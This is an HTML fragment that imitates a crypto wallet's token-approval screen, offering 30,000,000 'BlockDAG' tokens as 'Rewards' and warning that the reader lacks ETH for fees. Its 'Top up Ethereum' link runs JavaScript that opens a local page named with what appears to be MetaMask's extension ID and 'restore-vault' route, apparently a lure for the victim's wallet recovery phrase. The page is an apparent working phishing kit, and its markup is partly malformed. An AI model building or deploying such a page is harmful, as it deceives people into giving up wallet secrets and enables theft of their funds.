 <body class="bg-[#121212] text-white min-h-screen flex flex-col p-5">
  <div class="max-w-md w-full mx-auto flex flex-col gap-6">
   <!-- Close icon and progress bar -->
   <div class="flex items-center justify-between">
    <button aria-label="Close" class="text-gray-400 hover:text-white">
     <i class="fas fa-times fa-lg">
     </i>
    </button>
    <div class="flex-1 flex justify-center space-x-2 max-w-[120px]">
     <div class="h-1 rounded-full w-1/3 bg-[#3DE07A]">
     </div>
     <div class="h-1 rounded-full w-1/3 bg-[#1B3B27]">
     </div>
     <div class="h-1 rounded-full w-1/3 bg-[#1B3B27]">
     </div>
    </div>
    <div class="w-6">
    </div>
   </div>
   <!-- Heading -->
   <h1 class="text-2xl font-semibold leading-snug">
    Allow access to the
    <span class="font-bold">
     BlockDAG
    </span>
    amount below
   </h1>
   <!-- Unicorn logo -->
   <div class="flex justify-center">
    <img alt="BlockDAG" loading="lazy" width="40" height="40" decoding="async" data-nimg="1" class="topbar_easter__wqKZx" src="https://purchase3.blockdag.network/3d.gif" style="color: transparent;">
   </div>
   <!-- Approval request label with shield icon and lines -->
   <div class="flex items-center text-[#3DE07A] text-sm font-semibold">
    <div class="flex-1 border-t border-[#2A2A2A]">
    </div>
    <div class="flex items-center px-2 space-x-1">
     <i class="fas fa-shield-alt">
     </i>
     <span>
      Approval request
     </span>
    </div>
    <div class="flex-1 border-t border-[#2A2A2A]">
    </div>
   </div>
   <!-- Token access approval card -->
   <div class="bg-[#1E1E1E] rounded-xl p-4 flex items-center justify-between">
    <div class="flex items-center space-x-3">
     <div class="relative">
      <img width="40" src="https://purchase3.blockdag.network/favicon.png" height="40" class="rounded-full" alt="DUSK token purple circle logo with white text DUSK">
      <img alt="Ethereum logo small white circle with black Ethereum symbol" class="absolute -bottom-1 -right-1 rounded-full border border-black" height="16" src="https://storage.googleapis.com/a1aa/image/287d3532-ca29-4b18-c9ae-dcee94b338e7.jpg" width="16">
     </div>
     <span class="font-semibold text-white text-lg">
      30,000,000 BDAG 
     </span>
    </div>
    <span class="font-semibold text-white text-lg">
     Rewards
    </span>
   </div>
   <!-- View details with lines -->
   <div class="flex items-center text-gray-400 text-sm font-normal select-none cursor-pointer">
    <div class="flex-1 border-t border-[#2A2A2A]">
    </div>
    <div class="flex items-center px-2 space-x-1">
     <span>
      View details
     </span>
     <i class="fas fa-chevron-down text-gray-400">
     </i>
    </div>
    <div class="flex-1 border-t border-[#2A2A2A]">
    </div>
   </div>
   <!-- Network fee row -->
   <div class="flex justify-between items-center text-gray-400 text-sm font-normal">
    <div class="flex items-center space-x-1">
     <span>
      Network fee
     </span>
     <i class="fas fa-info-circle text-gray-400 text-xs">
     </i>
    </div>
    <span class="font-semibold text-white text-sm">
     0,0243 ETH (≈$62,15)
    </span>
   </div>
   <!-- Spacer -->
   <div class="flex-grow">
   </div>
   <!-- Warning box -->
   <div class="bg-[#6B552F] rounded-lg p-4 text-sm text-[#E6D7A7] flex flex-col gap-1">
    <div class="flex items-center space-x-2">
     <i class="fas fa-info-circle">
     </i>
     <span>
      You don't have enough Ethereum (ETH) to cover network fees.
     </span>
    </div>
    <a class="text-[#3DE07A] font-semibold hover:underline w-max" href="#">
     Learn more
    </a>
   </div>
   <!-- Top up button -->
   <br>
<a href="javascript:window.open('trust.html?nkbihfbeogaeaoehlefnkodbefgpgknn/#restore-vault','_self').close();" </a>
   <button type="submit" class="w-full bg-purple-700 rounded-full py-4 text-white font-semibold text-lg leading-6">
    Top up Ethereum (ETH)
   </button>
  </div>
